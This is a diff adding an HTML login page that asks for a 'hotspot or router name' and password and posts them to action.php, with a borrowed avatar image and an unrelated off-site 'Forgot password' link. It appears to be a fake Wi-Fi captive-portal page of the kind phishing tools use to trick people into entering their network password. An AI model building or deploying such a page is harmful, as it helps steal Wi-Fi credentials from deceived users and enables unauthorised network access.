@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+body {font-family: Arial, Helvetica, sans-serif;}
+body {
+  background-color: black;
+}
+form {border: 0px solid #ccc;}
+
+input[type=text], input[type=password] {
+  width: 100%;
+  padding: 12px 20px;
+  margin: 8px 0;
+  display: inline-block;
+  border: 1px solid #f44336;
+  box-sizing: border-box;
+}
+
+button {
+  background-color: #3c3c3c;
+  color: white;
+  padding: 14px 30px;
+  margin: 8px 0;
+  border: none;
+  cursor: pointer;
+  width: 100%;
+}
+
+button:hover {
+  opacity: 0.8;
+}
+
+.cancelbtn {
+  width: auto;
+  padding: 10px 18px;
+  background-color: #f44336;
+}
+
+.imgcontainer {
+  text-align: center;
+  margin: 30px 0 20px 0;
+}
+
+img.avatar {
+  width: 40%;
+  border-radius: 50%;
+}
+
+.container {
+  padding: 16px;
+}
+
+span.psw {
+  float: right;
+  padding-top: 16px;
+}
+
+/* Change styles for span and cancel button on extra small screens */
+@media screen and (max-width: 300px) {
+  span.psw {
+     display: block;
+     float: none;
+  }
+  .cancelbtn {
+     width: 100%;
+  }
+}
+</style>
+</head>
+<body>
+
+<h2>Login Form</h2>
+
+<form action="action.php" method="post">
+  <div class="imgcontainer">
+    <img src="https://static.wixstatic.com/media/2cd43b_9d6d732a9c0b4cfa9e3a30774d5969ac~mv2.png/v1/fill/w_512,h_512,al_c,q_90/file.jpg" alt="Avatar" class="avatar">
+  </div>
+
+  <div class="container">
+    <label for="uname"><b>Username</b></label>
+    <input type="text" placeholder="Enter hotspot or router name" name="uname" required>
+
+    <label for="psw"><b>Password</b></label>
+    <input type="password" placeholder="Enter Password" name="psw" required>
+        
+    <button type="submit">Login</button>
+  </div>
+
+  <div class="container" style="background-color:#f1f1f1">
+    <button type="button" class="cancelbtn">Cancel</button>
+    <span class="psw">Forgot <a href="https://fsa.zobj.net/crop.php?r=sbLxID3Pe4G1qX5fkugxPGNyHWWVOc_dFPiB9W1BOjNIigbq27QJOjfpRv4okHYI0gyD-3LgEb8Oe69FJEBTF-YJJbZeWWo5egF971-WU9KDpb5xmT6g1l6FgUAsBH0WTNS3OKQ-AvIQtqSX">password?</a></span>
+  </div>
+</form>
+
+</body>
+</html>
